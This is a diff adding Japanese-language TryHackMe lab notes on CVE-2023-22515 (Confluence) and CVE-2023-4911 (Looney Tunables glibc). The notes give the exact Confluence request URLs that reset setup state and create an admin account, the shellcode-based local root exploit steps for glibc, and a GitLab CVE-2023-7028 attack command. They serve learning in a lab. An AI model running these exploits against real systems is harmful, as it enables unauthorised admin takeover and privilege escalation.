@@ -370,3 +370,76 @@ https://github.com/Vozec/CVE-2023-7028/blob/main/CVE-2023-7028.py
 ```sh
 python3 attack.py -u http://10.10.207.254:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
 ```
+
+## CVE-2023-22515 (Confluence)
+
+https://tryhackme.com/room/confluence202322515
+
+- Atlassian Confluence Server および Data Center `<8.3.3`, `<8.4.3`, `<8.5.2`。※`8.2.0`他も有効。
+- Confluence に完全な管理者権限を持つ追加アカウントを作成できる。
+- 事前情報不要
+
+XWork による getter, setter の連鎖により、
+
+```
+http://10.10.217.49:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
+```
+
+のリクエストは、下記の Java 呼び出しに変換され、セットアップ未完了の状態になる。
+
+```
+getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false)
+```
+
+その後、次にリクエストから管理者アカウントを作成できる。
+
+```
+http://10.10.217.49:8090/setup/setupadministrator-start.action
+```
+
+スクリプト  
+https://github.com/Chocapikk/CVE-2023-22515
+
+## CVE-2023-4911 (Looney Tunables)
+
+https://tryhackme.com/room/looneytunes
+
+- GNU C ライブラリのダイナミックローダー（ld.so）に存在するセキュリティ上の欠陥
+- glibc `2.34`
+
+```sh
+# （参考）PoCを実行したマシンでは、2.35 と表示された
+$ ldd --version
+ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
+```
+
+### 背景
+
+```sh
+# コンパイル時、rpath でライブラリ検索パスを制御できる
+gcc -Wl,--enable-new-dtags -Wl,-rpath=/tmp -o myapp myapp.c
+```
+
+```sh
+# ld.so は、実行時に特定の環境変数をチェックする
+GLIBC_TUNABLES="malloc.check=1:malloc.tcache_max=128"
+```
+
+本来、SXID_ERASE とマークされる危険な設定項目を削除しているが、パース処理に不備があった。
+
+### エクスプロイト
+
+https://github.com/leesh3288/CVE-2023-4911
+
+メモリのランダムアドレスが偶然一致するまで、fork を繰り返すテクニックが使われている。
+
+```sh
+# "__libc_start_main" にシェルコードを上書きした libc.so.6 を生成
+python3 gen_libc.py
+
+# コンパイル
+gcc -o exp exp.c
+
+# 実行
+./exp
+```
